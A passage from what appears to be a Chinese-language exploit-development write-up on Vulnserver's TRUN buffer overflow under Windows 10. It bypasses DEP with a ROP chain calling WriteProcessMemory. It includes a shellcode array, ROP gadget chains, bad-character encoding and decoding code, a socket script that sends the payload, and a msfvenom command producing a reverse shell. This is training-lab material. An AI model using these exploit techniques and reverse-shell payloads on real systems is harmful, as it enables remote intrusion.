class="string">b"\x6d\x9a\x78\x46\xa9\xc6\xdb\xe7\xe8\xa2\x8a"</span></span><br><span class="line">shellcode += <span class="string">b"\x18\xea\x0c\x72\xbd\x61\xa0\x67\xcc\x28\xad"</span></span><br><span class="line">shellcode += <span class="string">b"\x44\xfd\xd2\x2d\xc3\x76\xa1\x1f\x4c\x2d\x2d"</span></span><br><span class="line">shellcode += <span class="string">b"\x2c\x05\xeb\xaa\x53\x3c\x4b\x24\xaa\xbf\xac"</span></span><br><span class="line">shellcode += <span class="string">b"\x6d\x69\xeb\xfc\x05\x58\x94\x96\xd5\x65\x41"</span></span><br><span class="line">shellcode += <span class="string">b"\x38\x85\xc9\x3a\xf9\x75\xaa\xea\x91\x9f\x25"</span></span><br><span class="line">shellcode += <span class="string">b"\xd4\x82\xa0\xef\x7d\x28\x5b\x78\x42\x05\x6e"</span></span><br><span class="line">shellcode += <span class="string">b"\xf1\x2a\x54\x70\x10\xf7\xd1\x96\x78\x17\xb4"</span></span><br><span class="line">shellcode += <span class="string">b"\x01\x15\x8e\x9d\xd9\x84\x4f\x08\xa4\x87\xc4"</span></span><br><span class="line">shellcode += <span class="string">b"\xbf\x59\x49\x2d\xb5\x49\x3e\xdd\x80\x33\xe9"</span></span><br><span class="line">shellcode += <span class="string">b"\xe2\x3e\x5b\x75\x70\xa5\x9b\xf0\x69\x72\xcc"</span></span><br><span class="line">shellcode += <span class="string">b"\x55\x5f\x8b\x98\x4b\xc6\x25\xbe\x91\x9e\x0e"</span></span><br><span class="line">shellcode += <span class="string">b"\x7a\x4e\x63\x90\x83\x03\xdf\xb6\x93\xdd\xe0"</span></span><br><span class="line">shellcode += <span class="string">b"\xf2\xc7\xb1\xb6\xac\xb1\x77\x61\x1f\x6b\x2e"</span></span><br><span class="line">shellcode += <span class="string">b"\xde\xc9\xfb\xb7\x2c\xca\x7d\xb8\x78\xbc\x61"</span></span><br><span class="line">shellcode += <span class="string">b"\x09\xd5\xf9\x9e\xa6\xb1\x0d\xe7\xda\x21\xf1"</span></span><br><span class="line">shellcode += <span class="string">b"\x32\x5f\x41\x10\x96\xaa\xea\x8d\x73\x17\x77"</span></span><br><span class="line">shellcode += <span class="string">b"\x2e\xae\x54\x8e\xad\x5a\x25\x75\xad\x2f\x20"</span></span><br><span class="line">shellcode += <span class="string">b"\x31\x69\xdc\x58\x2a\x1c\xe2\xcf\x4b\x35"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func  = struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x45454545</span>)     <span class="comment"># WriteProcessMemory Address</span></span><br><span class="line">func += struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x62501c10</span>)     <span class="comment"># Shellcode Return Address</span></span><br><span class="line">func += struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0xFFFFFFFF</span>)     <span class="comment"># pseudo Process handle</span></span><br><span class="line">func += struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x62501c10</span>)     <span class="comment"># Code cave address</span></span><br><span class="line">func += struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x41414141</span>)     <span class="comment"># dummy lpBuffer (Stack address) </span></span><br><span class="line">func += struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x41414141</span>)     <span class="comment"># dummy nSize</span></span><br><span class="line">func += struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x62502028</span>)     <span class="comment"># lpNumberOfBytesWritten</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">eip   = struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x62501022</span>)     <span class="comment"># retn   essfunc.dll</span></span><br><span class="line"></span><br><span class="line">rop1  = struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x755912d6</span>)    <span class="comment"># PUSH ESP # POP ESI # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x755b671f</span>)    <span class="comment"># MOV EDX,ESI # POP ESI # RETN 0x04    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x41414141</span>)    <span class="comment"># junk</span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x7728bdf4</span>)    <span class="comment"># MOV EAX,EDX # POP ESI # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x41414141</span>)    <span class="comment"># junk</span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x41414141</span>)    <span class="comment"># junk</span></span><br><span class="line"></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x758cc157</span>)    <span class="comment"># POP ECX # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x88888888</span>)    <span class="comment"># 0x88888888</span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x75515163</span>)    <span class="comment"># ADD EAX,ECX # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x758cc157</span>)    <span class="comment"># POP ECX # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x77777878</span>)    <span class="comment"># 0x77777878</span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x75515163</span>)    <span class="comment"># ADD EAX,ECX # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x772a9052</span>)    <span class="comment"># XCHG EAX,ECX # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x758fe636</span>)    <span class="comment"># MOV EAX,EDX # RETN  </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x772f4302</span>)    <span class="comment"># SUB EAX,16 # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x749f4480</span>)    <span class="comment"># INC EAX # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x749f4480</span>)    <span class="comment"># INC EAX # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x754e2d6d</span>)    <span class="comment"># MOV DWORD PTR [EAX],ECX # RETN    </span></span><br><span class="line"></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x74a01e84</span>)    <span class="comment"># INC EAX # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x74a01e84</span>)    <span class="comment"># INC EAX # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x74a01e84</span>)    <span class="comment"># INC EAX # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x74a01e84</span>)    <span class="comment"># INC EAX # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x772a5a6f</span>)    <span class="comment"># POP ECX # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0xfffffdf4</span>)    <span class="comment"># 0xfffffdf4</span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x772a9052</span>)    <span class="comment"># XCHG EAX,ECX # RETN  </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x758f15ce</span>)    <span class="comment"># NEG EAX # RETN</span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x772a9052</span>)    <span class="comment"># XCHG EAX,ECX # RETN </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x754e2d6d</span>)    <span class="comment"># MOV DWORD PTR [EAX],ECX # RETN    </span></span><br><span class="line"></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x772f4302</span>)    <span class="comment"># SUB EAX,16 # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x74a01e84</span>)    <span class="comment"># INC EAX # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x74a01e84</span>)    <span class="comment"># INC EAX # RETN    </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x76068122</span>)    <span class="comment"># XCHG EAX,EDI # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x758cc157</span>)    <span class="comment"># POP ECX # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x62506090</span>)    <span class="comment"># IAT 62506090  AddAtomA KERNEL32 </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x75fd7518</span>)    <span class="comment"># XCHG EAX,DWORD PTR [ECX] # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x772a9052</span>)    <span class="comment"># XCHG EAX,ECX # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x7557771b</span>)    <span class="comment"># POP EAX # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0xfffd9df0</span>)    <span class="comment"># 0xfffd9df0</span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x758f15ce</span>)    <span class="comment"># NEG EAX # RETN   </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x75515163</span>)    <span class="comment"># ADD EAX,ECX # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x772a9052</span>)    <span class="comment"># XCHG EAX,ECX # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x76068122</span>)    <span class="comment"># XCHG EAX,EDI # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x754e2d6d</span>)    <span class="comment"># MOV DWORD PTR [EAX],ECX # RETN    </span></span><br><span class="line"></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x749f2002</span>)    <span class="comment"># XCHG EAX,ESP # RETN    </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">padding = <span class="string">b"C"</span> * (<span class="number">3000</span><span class="number">-2006</span><span class="number">-32</span>-len(rop1)-len(shellcode))</span><br><span class="line"></span><br><span class="line">PAYLOAD = (</span><br><span class="line">    <span class="string">b'TRUN .'</span> +</span><br><span class="line">    <span class="string">b'A'</span> * (<span class="number">2006</span>-len(func)) +</span><br><span class="line">    func +</span><br><span class="line">    eip +</span><br><span class="line">    rop1 + </span><br><span class="line">    <span class="string">b"\x90"</span>*<span class="number">128</span>+</span><br><span class="line">    shellcode+</span><br><span class="line">    padding</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> socket.create_connection((HOST, PORT)) <span class="keyword">as</span> fd:</span><br><span class="line">    fd.sendall(PAYLOAD)</span><br></pre></td></tr></table></figure>
+
+<p>执行，出现问题了：</p>
+<p><img src="/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/14.png" alt="BOF"></p>
+<p>因为<code>msfvenom</code>解码存根希望代码存储在可写的内存里面，但是这里并没有。<code>msfvenom</code>解码器在这里变得无法使用，只能利用其他办法，比如自己写不包含坏字符的<code>shellcode</code>；或者替换坏字符，并在代码复制到代码段之前，恢复这些坏字符，这需要增加一些恢复的<code>ROP Gadgets</code>。</p>
+<p><strong>自定义shellcode</strong>：这里有个需要注意的地方，那就是遇到坏字符的处理，可以将产生坏字符的指令替换成其他指令，改变寄存器的值等，有点类似之前<code>egghunter</code>生成存在<code>00</code>字符时，改变指令的方法。这里利用外国友人的<a href="https://github.com/epi052/osed-scripts/blob/main/shellcoder.py" target="_blank" rel="noopener">脚本</a>，来生成<code>shellcode</code>：</p>
+<p><img src="/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/15.png" alt="BOF"></p>
+<p>注意对坏字符的检测，这里检测到坏字符，需要自己定位到相应的指令处，手动修改。多个坏字符用空格间隔开。</p>
+<p><img src="/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/16.png" alt="BOF"></p>
+<p>将利用脚本里面的<code>shellcode</code>部分替换成这里生成的<code>shellcode</code>，再次执行，喜闻乐见的反弹<code>shell</code>出现了：</p>
+<p><img src="/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/17.png" alt="BOF"></p>
+<p><strong>编码和解码shellcode：</strong>这种方法稍微复杂点，需要增加一些解码的<code>ROP Gadget</code>，在构建<code>ROP Chain</code>的时候，随着解码坏字符的<code>ROP Gadget</code>的增加，栈空间会随着增加，如果坏字符比价多，所需要的栈空间会更多。编码和解码部分的代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mapBadChars</span><span class="params">(sh)</span>:</span></span><br><span class="line">    BADCHARS = <span class="string">b"\x00"</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    badIndex = []</span><br><span class="line">    <span class="keyword">while</span> i &lt; len(sh):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> BADCHARS:</span><br><span class="line">            <span class="keyword">if</span> sh[i] == c:</span><br><span class="line">                badIndex.append(i)</span><br><span class="line">        i=i+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> badIndex</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encodeShellcode</span><span class="params">(sh)</span>:</span></span><br><span class="line">    BADCHARS = <span class="string">b"\x00"</span></span><br><span class="line">    REPLACECHARS = <span class="string">b"\xff"</span></span><br><span class="line">    encodedShell = sh</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(BADCHARS)):</span><br><span class="line">        encodedShell = encodedShell.replace(struct.pack(<span class="string">"B"</span>, BADCHARS[i]), struct.pack(<span class="string">"B"</span>, REPLACECHARS[i]))</span><br><span class="line">    <span class="keyword">return</span> encodedShell</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decodeShellcode</span><span class="params">(dllBase, badIndex, shellcode)</span>:</span></span><br><span class="line">    BADCHARS = <span class="string">b"\x00"</span></span><br><span class="line">    CHARSTOADD = <span class="string">b"\x01"</span></span><br><span class="line">    restoreRop = <span class="string">b""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(badIndex)):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            offset = badIndex[i]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            offset = badIndex[i] - badIndex[i<span class="number">-1</span>]</span><br><span class="line">        neg_offset = (-offset) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        value = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(BADCHARS)):</span><br><span class="line">            <span class="keyword">if</span> shellcode[badIndex[i]] == BADCHARS[j]:</span><br><span class="line">                value = CHARSTOADD[j]</span><br><span class="line">        value = (value) | <span class="number">0x11111100</span>    <span class="comment"># DL</span></span><br><span class="line">        print(hex(value))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        restoreRop += struct.pack(<span class="string">"&lt;L"</span>, (dllBase + <span class="number">0x7637768e</span>))   <span class="comment"># POP ECX # RETN       ** [WS2_32.DLL] **</span></span><br><span class="line">        restoreRop += struct.pack(<span class="string">"&lt;L"</span>, (neg_offset))</span><br><span class="line">        restoreRop += struct.pack(<span class="string">"&lt;L"</span>, (dllBase + <span class="number">0x758ba9a8</span>))   <span class="comment"># SUB EAX,ECX # RETN   ** [KERNEL32.DLL] ** </span></span><br><span class="line">        restoreRop += struct.pack(<span class="string">"&lt;L"</span>, (<span class="number">0x7721aed0</span>))             <span class="comment"># POP EDX # RETN       ** [ntdll.dll] **</span></span><br><span class="line">        restoreRop += struct.pack(<span class="string">"&lt;L"</span>, (value))                  <span class="comment"># values in DL</span></span><br><span class="line">        restoreRop += struct.pack(<span class="string">"&lt;L"</span>, (dllBase + <span class="number">0x755bc4eb</span>))   <span class="comment"># ADD BYTE PTR [EAX],DL # RETN    ** [KERNELBASE.dll] ** </span></span><br><span class="line">    <span class="keyword">return</span> restoreRop</span><br></pre></td></tr></table></figure>
+
+<p>这个算法的思路就是把每个坏字符的位置保存到一个列表里面，然后从头到尾进行遍历，到达坏字符的位置之后，进行某种运算，这里用的加法，因为<code>0x00-0xff=0x01</code>。我这里是从<code>shellcode</code>的开始位置往后遍历，有的也用开始位置之前往后遍历，主要是看能不能正确遍历每一个值，具体哪种视情况而定。还有上述<code>value=(value)|0x11111100</code>，这里<code>ROP Gadget</code>使用<code>DL</code>,为了保证其他为不会出现<code>00</code>，所以使用了<code>0x11111111</code>，另外不局限于<code>DL，AL，AH，BL，BH</code>等等都可以，关键在于能够找到符合要求的<code>ROP Gadget</code>。</p>
+<p>考虑到<code>ROP Gadgets</code>会比较长，这里有个小技巧，用于开辟一块比较大的栈空间存储<code>ROP Gadgets</code>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Patching dummy lpBuffer</span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x758cc157</span>)    <span class="comment"># POP ECX # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x88888888</span>)    <span class="comment"># 0x88888888</span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x75515163</span>)    <span class="comment"># ADD EAX,ECX # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x758cc157</span>)    <span class="comment"># POP ECX # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x77777988</span>)    <span class="comment"># 0x77777988</span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x75515163</span>)    <span class="comment"># ADD EAX,ECX # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x772a9052</span>)    <span class="comment"># XCHG EAX,ECX # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x758fe636</span>)    <span class="comment"># MOV EAX,EDX # RETN  </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x772f4302</span>)    <span class="comment"># SUB EAX,16 # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x749f4480</span>)    <span class="comment"># INC EAX # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x749f4480</span>)    <span class="comment"># INC EAX # RETN</span></span><br></pre></td></tr></table></figure>
+
+<p>这里使用<code>0x88888888+0x77777988=0000000100000210</code>（高<strong>8位</strong>截断，所以为<code>0x210</code>），要多大栈空间，可以大致评估出来，比如先确定有多少坏字符，每个坏字符需要多少<code>bytes ROP Gadgets</code>进行处理，加上处理<code>WriteProcessMemory</code>三个参数的<code>ROP Gadgets</code>，再加上对齐<code>shellcode</code>的<code>ROP Gadgets</code>和改变<code>ESP</code>到执行流的<code>ROP Gadgets</code>。</p>
+<p><img src="/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/18.png" alt="BOF"></p>
+<p>可以看到已经指向了<code>\x90</code>区域。</p>
+<p>后续需要注意的就是，解码之前需要让<code>ESP</code>正好指向<code>shellcode</code>开始的部分，我这里的ROP Gadgets如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Align EAX with shellcode</span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x772a5a6f</span>)    <span class="comment"># POP ECX # RETN </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0xfffffda8</span>)     <span class="comment"># 0n600</span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x772974e4</span>)    <span class="comment"># SUB EAX,ECX # RETN    ** [ntdll.dll] **</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/19.png" alt="BOF"></p>
+<p><img src="/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/20.png" alt="BOF"></p>
+<p>还有一个需要注意的地方，因为是自己来进行编码和解码，用<code>msfvenom</code>仅需生成原始<code>shellcode</code>即可。如本地使用如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.13.137 LPORT=4444 EXITFUNC=thread -f python -v shellcode</span><br></pre></td></tr></table></figure>
+
+<p>以上是需要注意的地方，当存在单个坏字符时，最终的利用脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'192.168.91.160'</span></span><br><span class="line">PORT = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mapBadChars</span><span class="params">(sh)</span>:</span></span><br><span class="line">    BADCHARS = <span class="string">b"\x00"</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    badIndex = []</span><br><span class="line">    <span class="keyword">while</span> i &lt; len(sh):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> BADCHARS:</span><br><span class="line">            <span class="keyword">if</span> sh[i] == c:</span><br><span class="line">                badIndex.append(i)</span><br><span class="line">        i=i+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> badIndex</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encodeShellcode</span><span class="params">(sh)</span>:</span></span><br><span class="line">    BADCHARS = <span class="string">b"\x00"</span></span><br><span class="line">    REPLACECHARS = <span class="string">b"\xff"</span></span><br><span class="line">    encodedShell = sh</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(BADCHARS)):</span><br><span class="line">        encodedShell = encodedShell.replace(struct.pack(<span class="string">"B"</span>, BADCHARS[i]), struct.pack(<span class="string">"B"</span>, REPLACECHARS[i]))</span><br><span class="line">    <span class="keyword">return</span> encodedShell</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decodeShellcode</span><span class="params">(dllBase, badIndex, shellcode)</span>:</span></span><br><span class="line">    BADCHARS = <span class="string">b"\x00"</span></span><br><span class="line">    CHARSTOADD = <span class="string">b"\x01"</span></span><br><span class="line">    restoreRop = <span class="string">b""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(badIndex)):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            offset = badIndex[i]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            offset = badIndex[i] - badIndex[i<span class="number">-1</span>]</span><br><span class="line">        